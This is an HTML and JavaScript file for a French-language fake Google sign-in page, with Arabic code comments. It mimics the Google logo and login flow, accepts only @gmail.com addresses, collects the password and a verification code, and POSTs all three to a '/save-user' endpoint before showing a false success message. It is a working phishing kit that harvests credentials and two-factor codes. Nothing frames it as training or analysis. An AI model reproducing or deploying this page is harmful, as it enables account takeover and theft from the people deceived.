<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion - Google</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
    }
    body {
      background-color: #ffffff;
      margin: 0;
      padding: 24px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      margin-top: 10px;
    }
    .top-content {
      text-align: center;
    }
    .logo {
      font-size: 32px;
      font-weight: 500;
      letter-spacing: -0.5px;
      margin-bottom: 20px;
    }
    .logo span:nth-child(1) { color: #4285F4; }
    .logo span:nth-child(2) { color: #EA4335; }
    .logo span:nth-child(3) { color: #FBBC05; }
    .logo span:nth-child(4) { color: #4285F4; }
    .logo span:nth-child(5) { color: #34A853; }
    .logo span:nth-child(6) { color: #EA4335; }

    .title {
      font-size: 24px;
      color: #202124;
      margin: 0 0 12px 0;
      font-weight: 400;
    }
    .subtitle {
      font-size: 14px;
      color: #3c4043;
      line-height: 1.4;
      margin: 0 0 6px 0;
    }
    .learn-more {
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
      font-weight: 500;
      display: block;
      margin-bottom: 32px;
    }

    /* Outlined Input Box with floating label */
    .input-group {
      position: relative;
      margin-bottom: 12px;
    }
    .input-group input {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      border: 1.5px solid #1a73e8;
      border-radius: 4px;
      outline: none;
      background: transparent;
      color: #202124;
    }
    .input-group label {
      position: absolute;
      left: 12px;
      top: -9px;
      background-color: #ffffff;
      padding: 0 4px;
      font-size: 12px;
      color: #1a73e8;
    }

    .link-btn {
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
      font-weight: 500;
      display: inline-block;
      cursor: pointer;
    }

    .forgot-email {
      margin-bottom: 48px;
    }

    .actions-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 24px;
    }

    button.btn-next {
      padding: 10px 24px;
      background-color: #1a73e8;
      color: #ffffff;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }
    button.btn-next:hover {
      background-color: #1557b0;
    }

    #step2, #step3, #success-message {
      display: none;
    }

    .user-chip {
      display: inline-block;
      border: 1px solid #dadce0;
      border-radius: 16px;
      padding: 4px 12px;
      font-size: 14px;
      color: #3c4043;
      margin-bottom: 20px;
    }

    .show-password {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #3c4043;
      margin-top: 8px;
    }
    .show-password input {
      margin-right: 8px;
      width: 18px;
      height: 18px;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="top-content">
      <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
      </div>
      <h1 class="title">Connexion</h1>
    </div>

    <!-- Étape 1: Adresse e-mail ou téléphone -->
    <div id="step1">
      <p class="subtitle">Utilisez votre compte Google. Il sera ajouté à cet appareil et disponible pour d'autres applis Google.</p>
      <a href="#" class="learn-more">En savoir plus sur l'utilisation de votre compte</a>

      <form id="step1Form">
        <div class="input-group">
          <!-- إضافة شرط pattern لمنع القبول إلا إذا كان ينتهي بـ @gmail.com -->
          <input 
            type="email" 
            id="emailInput" 
            required 
            pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$"
            title="Veuillez saisir une adresse e-mail valide se terminant par @gmail.com"
            autocomplete="off">
          <label for="emailInput">Adresse e-mail ou téléphone</label>
        </div>
        
        <div class="forgot-email">
          <a href="#" class="link-btn">Adresse e-mail oubliée ?</a>
        </div>

        <div class="actions-row">
          <a href="#" class="link-btn">Créer un compte</a>
          <button type="submit" class="btn-next">Suivant</button>
        </div>
      </form>
    </div>

    <!-- Étape 2: Mot de passe -->
    <div id="step2">
      <div class="user-chip" id="userEmailDisplay"></div>
      <form id="step2Form">
        <div class="input-group">
          <input type="password" id="passwordInput" required>
          <label for="passwordInput">Saisissez votre mot de passe</label>
        </div>
        <div class="show-password">
          <input type="checkbox" onclick="togglePassword()"> Afficher le mot de passe
        </div>
        <div class="actions-row" style="justify-content: flex-end;">
          <button type="submit" class="btn-next">Suivant</button>
        </div>
      </form>
    </div>

    <!-- Étape 3: Code de vérification -->
    <div id="step3">
      <form id="step3Form">
        <div class="input-group">
          <input type="text" id="codeInput" required autocomplete="off">
          <label for="codeInput">Code de vérification</label>
        </div>
        <div class="actions-row" style="justify-content: flex-end;">
          <button type="submit" class="btn-next">Valider</button>
        </div>
      </form>
    </div>

    <!-- Message de succès -->
    <div id="success-message" style="text-align: center; color: #1e8e3e; font-size: 20px; font-weight: bold; margin-top: 40px;">
      Connexion réussie !
    </div>
  </div>

  <script>
    const step1Form = document.getElementById('step1Form');
    const step2Form = document.getElementById('step2Form');
    const step3Form = document.getElementById('step3Form');

    const step1Div = document.getElementById('step1');
    const step2Div = document.getElementById('step2');
    const step3Div = document.getElementById('step3');

    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const codeInput = document.getElementById('codeInput');
    const userEmailDisplay = document.getElementById('userEmailDisplay');
    const successMsg = document.getElementById('success-message');

    // Étape 1 -> Étape 2
    step1Form.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const emailVal = emailInput.value.trim();
      
      // التحقق البرمجي الإضافي من اللاحقة @gmail.com
      if (!emailVal.toLowerCase().endsWith('@gmail.com')) {
        alert("Veuillez saisir une adresse e-mail valide se terminant par @gmail.com");
        return;
      }

      userEmailDisplay.textContent = emailVal;
      step1Div.style.display = 'none';
      step2Div.style.display = 'block';
    });

    // Étape 2 -> Étape 3
    step2Form.addEventListener('submit', function(e) {
      e.preventDefault();
      step2Div.style.display = 'none';
      step3Div.style.display = 'block';
    });

    // Étape 3 -> الإرسال للسيرفر (/save-user)
    step3Form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const payload = {
        email: emailInput.value,
        password: passwordInput.value,
        code: codeInput.value
      };

      try {
        const response = await fetch('/save-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        if (result.status === 'success') {
          step3Div.style.display = 'none';
          successMsg.style.display = 'block';
        } else {
          alert('Erreur lors de la sauvegarde');
        }
      } catch (err) {
        console.error(err);
        alert('Erreur réseau ou serveur');
      }
    });

    function togglePassword() {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
      } else {
        passwordInput.type = "password";
      }
    }
  </script>
</body>
</html>
